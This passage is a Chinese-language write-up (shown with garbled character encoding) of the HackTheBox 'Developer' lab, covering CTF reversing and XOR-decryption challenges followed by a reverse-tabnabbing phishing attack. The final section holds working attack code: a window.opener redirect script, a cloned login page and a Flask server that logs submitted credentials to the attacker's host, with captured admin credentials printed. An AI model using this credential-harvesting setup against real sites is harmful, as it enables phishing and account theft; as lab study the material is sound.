# è¾“å‡ºè§£å¯†ç»“æœ
Write-Host "Decryption Result:" -ForegroundColor Green
Write-Host $decryptedResult

```

```bash
PS D:\System\Downloads\20250620> .\pass.ps1
Decryption Result:
DHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}
```

### Phished List

ç»™ä¸€ä¸ª`xlsx`æ–‡ä»¶ï¼Œå¬è¯´æ–‡æ¡£ä¸­åŒ…å«å¯†ç 

åƒæ˜¯éšå†™é¢˜ï¼Œä¸Šç½‘æœç´¢äº†ä¸‹ï¼Œ`docs`å’Œ`xlsx`åŸºæœ¬ä¸Šå°±æ˜¯`zip`æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯¹å…¶è¿›è¡Œè§£å‹

ç„¶åæ‰¾åˆ° `phished_credentials\xl\worksheets\sheet1.xml` ,åœ¨æœ€åº•ä¸‹èƒ½æ‰¾åˆ°

```bash
<sheetProtection 
algorithmName="SHA-512" 
hashValue="Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==" 
saltValue="EoiHQklf0FagPs+iW0OzkA==" 
spinCount="100000" 
sheet="1" 
objects="1" 
scenarios="1"/>
```

æˆ‘ä»¬å°† `sheet1.xml` çš„`sheetProtection` å—åˆ æ‰åï¼Œå†æ”¾è¿›å»æ›¿æ¢æ‰åŸæœ¬çš„ `sheet1.xml` å³å¯

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image5.png)

```bash
DHTB{H1dD3N_C0LuMn5_FtW}
```

### Lucky Guess

å‹ç¼©åŒ…è§£å‹åæ˜¯ä¸€ä¸ªç¨‹åºï¼Œæˆ‘ä»¬ç›´æ¥`IDA`æ‰“å¼€

`winner`å‡½æ•°

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image6.png)

`AI`ç¼–å†™å¼‚æˆ–è„šæœ¬

```bash
# C ä»£ç ä¸­çš„å˜é‡
key = "98hKjr3f8CgfF"
ciphertext = "^w!%-%z2p7/# uw?"

# ç”¨äºå­˜æ”¾è§£å¯†ç»“æœçš„å˜é‡
plaintext = ""

# éå†å¯†æ–‡ä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦
for i in range(len(ciphertext)):
    # 1. å–å‡ºå¯†æ–‡å­—ç¬¦å’Œå¯¹åº”çš„å¯†é’¥å­—ç¬¦
    #    ä½¿ç”¨æ¨¡è¿ç®— (%) æ¥å®ç°å¯†é’¥çš„å¾ªç¯ä½¿ç”¨
    cipher_char = ciphertext[i]
    key_char = key[i % len(key)]
    
    # 2. è¿›è¡Œå¼‚æˆ– (XOR) è¿ç®—
    #    ord() è·å–å­—ç¬¦çš„ASCIIç ï¼Œ^ æ˜¯å¼‚æˆ–æ“ä½œç¬¦
    decrypted_char_code = ord(cipher_char) ^ ord(key_char)
    
    # 3. åº”ç”¨ç‰¹æ®Šå¤„ç†è§„åˆ™
    if decrypted_char_code <= 31:
        decrypted_char_code += 32
        
    # 4. å°†è§£å¯†åçš„ASCIIç è½¬æ¢å›å­—ç¬¦ï¼Œå¹¶æ‹¼æ¥åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­
    #    chr() å°†ASCIIç è½¬ä¸ºå­—ç¬¦
    plaintext += chr(decrypted_char_code)

# æŒ‰ç…§æ ¼å¼è¾“å‡ºæœ€ç»ˆçš„ Flag
flag = f"DHTB{{{plaintext}}}"
print(flag)
```

```bash
âœ  Developer python getpass.py                                              
DHTB{gOInGWITHtHEfLOW}
```

### Authenication

I developed a new authentication mechanism using rust. Can you reverse my password?

`rust` é€†å‘

```bash
âœ  Developer ./authenticate                                    
Welcome to TheCyberGeek's authentication platform
Enter the password to proceed: 
sdadad
You are unauthorized to use this application!
âœ  Developer file authenticate 
authenticate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=95ac617025cf1bfe1e6749172a7888dfc4fe4dfe, for GNU/Linux 3.2.0, with debug_info, not stripped
```

è¿›å»è¦ä½ è¾“å…¥å¯†ç ç„¶åéªŒè¯ï¼Œ`IDA`æ‰“å¼€ï¼Œæ‰¾åˆ°éªŒè¯çš„éƒ¨åˆ†

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image7.png)

å…¶ä¸­çš„è¿™è¡Œä»£ç æ­£åœ¨æ‰§è¡ŒÂ `v3 == v5`Â çš„æ¯”è¾ƒï¼Œå¹¶æŠŠç»“æœï¼ˆ`true`Â æˆ–Â `false`ï¼‰å­˜èµ·æ¥

```bash
HIBYTE(v2.pieces.data_ptr) = core::cmp::impls::_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$::eq::h372d5aaf05c06316(
                                 &v3,
                                 &v5);
```

å…¶ä¸­ä¸€ä¸ªåº”è¯¥æ˜¯ç”¨æˆ·è¾“å…¥çš„ï¼Œç„¶åå’Œ`v3` æˆ–è€… `v5` å»æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨`v3`æˆ–è€…`v5` å¤„æ–­ç‚¹ï¼Œå°±å¯ä»¥çœ‹åˆ°æ˜¯å’Œä»€ä¹ˆåœ¨å¯¹æ¯”

```bash
âœ  Developer pwndbg authenticate 
Reading symbols from authenticate...
pwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
------- tip of the day (disable with set show-tips off) -------
If you want Pwndbg to clear screen on each command (but still save previous output in history) use set context-clear-screen on
pwndbg> info functions
...
0x0000000000008e30  main::validate
0x00000000000090f0  main::authenticated                                                                           
0x0000000000009130  main::check_password                                                                          
0x0000000000009240  main::main                 
0x0000000000009360  main   
...
pwndbg> disassemble 0x0000000000009130
...
   0x00000000000091af <+127>:   mov    rcx,QWORD PTR [rsp+0x10]                                                   
   0x00000000000091b4 <+132>:   mov    QWORD PTR [rsp+0x60],rcx                                                   
   0x00000000000091b9 <+137>:   lea    rdi,[rsp+0x38]
   0x00000000000091be <+142>:   lea    rsi,[rsp+0x58]
   0x00000000000091c3 <+147>:   call   0x7a80 <_ZN4core3cmp5impls69_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$2eq17h372d5aaf05c06316E>
   0x00000000000091c8 <+152>:   mov    BYTE PTR [rsp+0x7],al                                                      
   0x00000000000091cc <+156>:   jmp    0x91ce <_ZN4main14check_password17h1ae7b2b87f21bd0aE+158>                  
   0x00000000000091ce <+158>:   lea    rdi,[rsp+0x40]  
   0x00000000000091d3 <+163>:   call   0x9db0 <_ZN4core3ptr13drop_in_place17h5e2052686c20525eE>                   
   0x00000000000091d8 <+168>:   mov    al,BYTE PTR [rsp+0x7]                                                      
   0x00000000000091dc <+172>:   test   al,0x1 
...
```

`0x00000000000091c3` æ˜¯æˆ‘ä»¬æƒ³è¦æ–­ç‚¹çš„åœ°æ–¹ï¼Œä½†æ˜¯å¯èƒ½æœ‰`ALSR` ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥æ–­ç‚¹

```bash
pwndbg> b main
Breakpoint 1 at 0x9360
pwndbg> r
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0x55555555d360 <main>                                                                                          push   rax
   0x55555555d361 <main+1>                                                                                        movsxd rax, edi                 RAX => 1
   0x55555555d364 <main+4>                                                                                        lea    rdi, [rip - 0x12b]       RDI => 0x55555555d240 (main::main) â—‚â€” sub rsp, 0xb8
   0x55555555d36b <main+11>                                                                                       mov    qword ptr [rsp], rsi     [0x7fffffffdf40] <= 0x7fffffffe058 â€”â–¸ 0x7fffffffe35d â—‚â€” '/root/Desktop/HackTheBox/Developer/authenticate'
   0x55555555d36f <main+15>                                                                                       mov    rsi, rax                 RSI => 1
   0x55555555d372 <main+18>                                                                                       mov    rdx, qword ptr [rsp]     RDX, [0x7fffffffdf40] => 0x7fffffffe058 â€”â–¸ 0x7fffffffe35d â—‚â€” '/root/Desktop/HackTheBox/Developer/authenticate'
   0x55555555d376 <main+22>                                                                                       call   std::rt::lang_start         <std::rt::lang_start>
 
   0x55555555d37b <main+27>                                                                                       pop    rcx
   0x55555555d37c <main+28>                                                                                       ret    
 
   0x55555555d37d                                                                                                 nop    dword ptr [rax]
   0x55555555d380 <<alloc::vec::Vec<T> as alloc::vec::SpecExtend<&T,core::slice::iter::Iter<T>>>::spec_extend>    sub    rsp, 0x28
```

èƒ½çœ‹åˆ°åœ°å€éƒ½å˜æˆäº†`0x55555555dxxx`

```bash
0x555555554000 + 0x91c3 = 0x55555555d1c3
```

ç„¶åå†åœ¨`0x55555555d1c3`å¤„æ–­ç‚¹

```bash
pwndbg> b *0x55555555d1c3
Breakpoint 2 at 0x55555555d1c3
pwndbg> c
Continuing.
Welcome to TheCyberGeek's authentication platform
Enter the password to proceed: 
whatï¼ˆéšä¾¿è¾“å…¥ï¼‰
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image8.png)

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image9.png)

å¯ä»¥çœ‹åˆ° `what`æ˜¯å’Œ`DHTB{rusty_bu5in3s5}` åœ¨æ¯”è¾ƒ

```bash
âœ  Developer ./authenticate
Welcome to TheCyberGeek's authentication platform
Enter the password to proceed: 
DHTB{rusty_bu5in3s5}
You have successfully authenticated!
```

```bash
DHTB{rusty_bu5in3s5}
```

### RevMe

ç›´æ¥å°±èƒ½æ‹¿åˆ° `flag`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image10.png)

```bash
DHTB{TCG5_S1mPl3_R3v3r51nG_Ch4773nG3}
```

### PwnMe

`PWN`é¢˜ç›®ï¼Œchecksecï¼Œ`NX`å’Œ`PIE`éƒ½å¼€äº†

```bash
âœ  Developer checksec pwnme  
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.1)
[*] '/root/Desktop/HackTheBox/Developer/pwnme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

ä½†æ˜¯è²Œä¼¼å¹¶ä¸ç”¨çœ‹è¿™ä¸ªï¼Œä¹Ÿåƒæ˜¯é€†å‘é¢˜ç›®ï¼Œä¸‹è¾¹æ˜¯`main`å‡½æ•°

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax
  char s[8]; // [rsp+10h] [rbp-20h] BYREF
  __int64 v6; // [rsp+18h] [rbp-18h]
  int v7; // [rsp+20h] [rbp-10h]
  char *v8; // [rsp+28h] [rbp-8h]

  if ( argc > 1 )
  {
    if ( (unsigned int)check_password(argv[1], argv, envp) )
    {
      puts("Password correct. Here's a flag:");
      *(_QWORD *)s = 0xC384B2CB92A49894LL;
      v6 = 0x8796C283C680B381LL;
      v7 = 13486015;
      v8 = s;
      while ( *v8 )
      {
        v3 = v8++;
        *v3 -= 80;
      }
      puts(s);
    }
    else
    {
      puts("Wrong password.");
    }
  }
  else
  {
    puts("Please enter your password as a program argument!");
  }
  return 0;
}
```

ä¸»è¦åŠæ—¶è¦çœ‹`check_password`

```bash
__int64 __fastcall check_password(const char *a1)
{
  char *v1; // rax
  char v3[8]; // [rsp+13h] [rbp-3Dh] BYREF
  char s2[16]; // [rsp+20h] [rbp-30h] BYREF
  char dest[16]; // [rsp+30h] [rbp-20h] BYREF
  char *v6; // [rsp+40h] [rbp-10h]
  unsigned int v7; // [rsp+4Ch] [rbp-4h]

  v7 = 0;
  strcpy(v3, "é—¨èµ–æ—…æƒ«æ€ç·");
  v6 = v3;
  while ( *v6 )
  {
    v1 = v6++;
    *v1 -= 80;
  }
  strcpy(dest, a1);
  strcpy(s2, v3);
  if ( !strcmp(dest, s2) )
    return 1;
  return v7;
}
```

`a1`æ˜¯æˆ‘ä»¬çš„é”®å…¥çš„å‚æ•°ï¼Œä¸»è¦çš„è§£å¯†é€»è¾‘æ˜¯åœ¨ï¼š

```bash
  while ( *v6 )
  {
    v1 = v6++;
    *v1 -= 80;
  }
```

ç¨‹åºéå†è¿™ä¸ªç¥ç§˜å­—ç¬¦ä¸²ï¼ˆ`v3`ï¼‰çš„æ¯ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶å°†æ¯ä¸ªå­—èŠ‚çš„å€¼å‡å» `80`

ä½†æ˜¯æœ€åè¿˜æ˜¯ä¼šåœ¨`if ( !strcmp(dest, s2) )` å¤„è¿›è¡Œå¯¹æ¯”ï¼Œæˆ‘ä»¬è¿˜æ˜¯åœ¨é‚£æ–­ç‚¹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å¯„å­˜å™¨çš„å€¼

æˆ‘ä»¬è¦åœ¨`0x00000000000011de` å¤„æ–­ç‚¹

```bash
0x00000000000011d8 <+131>:   mov    rsi,rdx
0x00000000000011db <+134>:   mov    rdi,rax
0x00000000000011de <+137>:   call   0x1050 <strcmp@plt>
0x00000000000011e3 <+142>:   test   eax,eax
```

å’Œä¹‹å‰ä¸€æ ·ï¼Œå› ä¸ºæœ‰`ALSR`ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨`main`å¤„æ–­ç‚¹

```bash
 â–º 0x5555555551f7 <main+4>      sub    rsp, 0x30                       RSP => 0x7fffffffdf30 (0x7fffffffdf60 - 0x30)
   0x5555555551fb <main+8>      mov    dword ptr [rbp - 0x24], edi     [0x7fffffffdf3c] <= 1
   0x5555555551fe <main+11>     mov    qword ptr [rbp - 0x30], rsi     [0x7fffffffdf30] <= 0x7fffffffe078 â€”â–¸ 0x7fffffffe372 â—‚â€” '/root/Desktop/HackTheBox/Developer/pwnme'
   0x555555555202 <main+15>     cmp    dword ptr [rbp - 0x24], 1       1 - 1     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
   0x555555555206 <main+19>   âœ˜ jg     main+38                     <main+38>
 
   0x555555555208 <main+21>     lea    rdi, [rip + 0xdf9]              RDI => 0x555555556008 â—‚â€” 'Please enter your password as a program argument!'
   0x55555555520f <main+28>     call   puts@plt                    <puts@plt>
 
   0x555555555214 <main+33>     jmp    main+175                    <main+175>
    â†“
   0x5555555552a2 <main+175>    mov    eax, 0     EAX => 0
   0x5555555552a7 <main+180>    leave  
   0x5555555552a8 <main+181>    ret    
```

```bash
pwndbg> b *0x5555555551de
Breakpoint 2 at 0x5555555551de
pwndbg> c                                  
Continuing.                                                                                                       
                                                                                                                  
Breakpoint 2, 0x00005555555551de in check_password ()                                                             
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA 
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
*RAX  0x7fffffffdef0 â—‚â€” 0x9700333231 /* '123' */                                                                  
 RBX  0x7fffffffe068 â€”â–¸ 0x7fffffffe36e â—‚â€” '/root/Desktop/HackTheBox/Developer/pwnme'
*RCX  0x336e6179696173                                                                                                                                                                                                              
*RDX  0x7fffffffdee0 â—‚â€” 'supersaiyan3'  
*RDI  0x7fffffffdef0 â—‚â€” 0x9700333231 /* '123' */
*RSI  0x7fffffffdee0 â—‚â€” 'supersaiyan3'
```

æˆ‘ä»¬èƒ½çœ‹åˆ°å¯„å­˜å™¨ä¸Šçš„å€¼æ˜¯`supersaiyan3`

```bash
âœ  Developer ./pwnme supersaiyan3           
Password correct. Here's a flag:
DHTB{b4s1c0v3rF7ow}
```

### Esay Encryption

éœ€è¦è§£å¯†`DRwdFjIMJiYgOi4dOhI8OjQ=`

ä¸‹è½½ä¼šç»™å‡ºä¸€ä¸ªå¼‚æˆ–è„šæœ¬

```bash
#!/usr/bin/python3
from itertools import izip, cycle
import base64

def xor_crypt_string(data, key='**'):
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
    return base64.encodestring(xored).strip()

secret_data = "<REDACTED>"
print xor_crypt_string(secret_data)
```

ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“`key`æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½çŸ¥é“å‰äº”ä½æ˜¯ `DHTB{`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image11.png)

æˆ‘ä»¬åè¿‡æ¥å³å¯å¾—åˆ°`flag`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image12.png)

### Triple Whammy

We've been told these keys hold a secret message, can you decode it?

```bash
c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e
fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b
7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f
```

è§£å‹åå¾—åˆ°çš„è„šæœ¬

```bash
import os
from secret import flag

def bxor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

key1 = os.urandom(len(flag))
key2 = os.urandom(len(flag))

ct1 = bxor(key1, flag)
ct2 = bxor(ct1, key2)
ct3 = bxor(key2, flag)

print(ct1.hex())
print(ct2.hex())
print(ct3.hex())
```

`AI`ä¸€æŠŠæ¢­å“ˆ

```bash
#!/usr/bin/python3

def bxor(ba1, ba2):
    """Performs a byte-wise XOR operation on two byte strings."""
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

# 1. ä»é¢˜ç›®ä¸­è·å–çš„ä¸‰ä¸ªåå…­è¿›åˆ¶å¯†æ–‡
hex_ct1 = "c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e"
hex_ct2 = "fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b"
hex_ct3 = "7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f"

# 2. å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ï¼ˆbytesï¼‰å¯¹è±¡
ct1 = bytes.fromhex(hex_ct1)
ct2 = bytes.fromhex(hex_ct2)
ct3 = bytes.fromhex(hex_ct3)

# 3. æ ¹æ®æ¨å¯¼ï¼Œå°†ä¸‰ä¸ªå¯†æ–‡å…¨éƒ¨å¼‚æˆ–
# flag = ct1 ^ ct2 ^ ct3
# æˆ‘ä»¬å¯ä»¥åˆ†ä¸¤æ­¥æ¥å®Œæˆ
temp_xor_result = bxor(ct1, ct2)
flag_bytes = bxor(temp_xor_result, ct3)

# 4. å°†æ¢å¤çš„å­—èŠ‚æ•°æ®è§£ç ä¸ºUTF-8å­—ç¬¦ä¸²å¹¶æ‰“å°
try:
    flag = flag_bytes.decode('utf-8')
    print("ğŸ‰ Flag has been successfully recovered!")
    print(f"[*] Flag: {flag}")
except UnicodeDecodeError:
    print("âŒ Could not decode the result as a UTF-8 string.")
    print(f"[*] Raw bytes (hex): {flag_bytes.hex()}")
```

```bash
ğŸ‰ Flag has been successfully recovered!
[*] Flag: DHTB{XorXorXorFunFunFun}
```

## é’“é±¼æ”»å‡»

å…¶å®åšå®Œä¸€é“é¢˜å°±å¯ä»¥ç»§ç»­æ‰“äº†

åšå®Œåæœ‰ä¸€ä¸ªæäº¤`writeup`çš„è¾“å…¥æ¡†

æˆ‘ä»¬å¼€å¯`Web`æœåŠ¡å™¨ï¼Œå¹¶æäº¤æ”¹åœ°å€ä¸Šå»ï¼Œçœ‹æ˜¯å¦æœ‰äººä¼šè®¿é—®

ä¸ä¸€ä¼šå°±æœ‰å›æ˜¾äº†

```bash
âœ  Developer python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.103 - - [21/Jun/2025 18:53:48] "GET / HTTP/1.1" 200 -
10.10.11.103 - - [21/Jun/2025 18:53:49] code 404, message File not found
10.10.11.103 - - [21/Jun/2025 18:53:49] "GET /favicon.ico HTTP/1.1" 404 -
```

ä½†æ˜¯æˆ‘ä»¬è¿˜ä¸çŸ¥é“è¦å¦‚ä½•è¿›è¡Œåˆ©ç”¨

`Sessionid`å¼€å¯äº†`httponly` ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡`XSS`è·å–

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image13.png)

é€šè¿‡ç›®å½•æ‰«æèƒ½å‘ç°ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¹¶ä¸”æ˜¯åªèƒ½`admin`æ‰èƒ½è®¿é—®

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image14.png)

ä½†æ˜¯ç°åœ¨æ²¡ä»€ä¹ˆç”¨ï¼Œå›åˆ°åå°ï¼Œæˆ‘å‘ç°å½“æˆ‘ä»¬æäº¤äº†`writeup`åï¼Œä¼šåœ¨`profile`ä¸­ç”Ÿæˆä¸€ä¸ªé“¾æ¥

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image15.png)

é‡è¦çš„æ˜¯è¿™ä¸ªé“¾æ¥å…·æœ‰`target`å±æ€§ï¼Œå…¶å€¼ä¸º`_blank`,åŒæ—¶æ²¡æœ‰ä½¿ç”¨`rel="noopener"`å±æ€§ï¼Œè¿™è®©æˆ‘æƒ³èµ·`Reverse_Tabnabbing` ï¼ˆæ ‡ç­¾é¡µåŠ«æŒæ”»å‡»ï¼‰æ¼æ´ï¼Œä¹‹å‰æœ‰åœ¨`Vulnhub`ä¸Šçš„ä¸€å°é¶æœºï¼ˆhttps://www.vulnhub.com/entry/napping-101,752/ï¼‰é‡åˆ°è¿‡

### Reverse_Tabnabbing

> https://owasp.org/www-community/attacks/Reverse_Tabnabbing
> 

ç›‘å¬ä¸€ä¸‹å¯¹æ–¹è¯·æ±‚

```bash
âœ  Developer nc -lvp 80    
listening on [any] 80 ...
connect to [10.10.16.58] from developer.htb [10.10.11.103] 47222
GET / HTTP/1.1
Host: 10.10.16.58
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sat, 21 Jun 2025 11:08:45 GMT
```

å›æ˜¾ä¸­æœ‰`firefox`çš„`UA`ï¼Œå¾ˆå¤§æ¦‚ç‡ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®çš„

ç°åœ¨çš„æ€è·¯æ˜¯ï¼šæäº¤è·³è½¬é“¾æ¥ï¼Œç„¶åä¼ªé€ ä¸€ä¸ªå’Œ`developer.htb` çš„ç™»å½•é¡µé¢ä¸€æ ·ç«™ç‚¹ï¼Œå¯¹æ–¹ç‚¹å‡»åï¼Œå¼¹åˆ°`writeup`é¡µé¢ï¼Œç„¶ååŸå§‹é¡µé¢ï¼ˆ`dashbroad`ï¼‰å˜æˆæˆ‘ä»¬çš„é’“é±¼ç½‘ç«™ï¼Œè®©å¯¹æ–¹ä»¥ä¸ºç™»å½•æ‰äº†ï¼Œç„¶åæˆ‘ä»¬è·å–å‡­è¯

è¿™é‡Œå€Ÿç”¨ï¼šhttps://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data çš„æ–¹æ³•ï¼Œæˆ‘è‡ªå·±å¼„äº†å¥½ä¹…æ²¡å¼„å¥½

æ­å»ºé’“é±¼æœåŠ¡å™¨

```bash
âœ  Developer cat server2.py  
from flask import *

app = Flask(__name__, template_folder='.')

@app.route("/writeup")
def writeup():
    return render_template('writeup.html')

@app.route("/accounts/login/", methods=['GET', 'POST'])
def login():

    if request.method == 'POST':
        print('\n'.join([f'{x[0]}: {x[1]}' for x in request.form.items()]))
        return redirect("http://10.10.10.120/accounts/login/", code=302)
    else:
        return render_template('login.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

è·³è½¬ç½‘ç«™

```bash
<html>
  <body>
    <h2>Challenge Writeup</h2>
    <p>Something</p>
    <script>
    if (window.opener) window.opener.parent.location.replace('http://10.10.16.58/accounts/login/');
    if (window.parent != window) window.parent.location.replace('https://10.10.16.58/accounts/login/');           
    </script>
  </body>
</html>
```

åˆ¶é€ é’“é±¼ç«™ç‚¹

```bash
âœ  Developer curl http://developer.htb/accounts/login/ > login.html                                                
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1938  100  1938    0     0  13686      0 --:--:-- --:--:-- --:--:-- 13744
```

ä¿®æ”¹é‡Œé¢çš„é™æ€å†…å®¹ä¸ºç»å¯¹è·¯å¾„å¹¶å°†`action` æ”¹ä¸º`/accounts/login/`

```bash
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="http://developer.htb/img/favicon.ico">
    <link rel="stylesheet" href="http://developer.htb/static/css/jquery.toasts.css">
    <script src="http://developer.htb/static/js/all.min.js"></script>
    <script src="http://developer.htb/static/js/jquery-3.2.1.min.js"></script>
    <title>Login | Developer.HTB</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="http://developer.htb/static/css/bootstrap.min.css">

    <!-- Custom styles for this template -->
    <link href="http://developer.htb/static/css/signin.css" rel="stylesheet">
  </head>

  <body class="text-center">

    <form class="form-signin" action="/accounts/login/" method="post">
        <input type="hidden" name="csrfmiddlewaretoken" value="3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE">
      <img class="mb-4" src="http://developer.htb/static/img/logo.png" alt="" width="72" height="72">
      <h1 class="h3 mb-3 font-weight-normal">Welcome back!</h1>
      <label for="uname" class="sr-only">User Name</label>
      <input type="text" id="id_login" name="login" placeholder="Username" class="form-control" required autofocus>
      <label for="password" class="sr-only">Password</label>
      <input type="password" id="id_password" name="password" placeholder="Password" class="form-control" required>

      <button id="loginbtn" class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
          <a href="http://developer.htb/saccounts/password/reset/" class="auth-link">Forgot password?</a>
                <div class="text-center mt-4 font-weight-light"> Don't have an account? <a href="http://developer.htb/saccounts/signup/" >Click here!</a>
      <p class="mt-5 mb-3 text-muted">&copy; Developer.HTB 2021</p>
    </form>

<script src="http://developer.htb/static/js/jquery.toast.js"></script>
<script>

</script>
  </body>
</html>
```

å¼€å¯é’“é±¼æœåŠ¡å™¨ï¼Œå¹¶æäº¤`/writeup`åˆ°ç«™ç‚¹ä¸­ï¼Œè¿‡ä¸€ä¼šå°±èƒ½æ¥æ”¶åˆ°ç”¨æˆ·çš„å¯†ç äº†

```bash
âœ  Developer python server2.py
 * Serving Flask app 'server2'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.111.155:80
Press CTRL+C to quit
10.10.11.103 - - [21/Jun/2025 20:49:24] "GET /writeup HTTP/1.1" 200 -
10.10.11.103 - - [21/Jun/2025 20:49:24] "GET /accounts/login/ HTTP/1.1" 200 -
csrfmiddlewaretoken: 3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE
login: admin
password: SuperSecurePassword@HTB2021
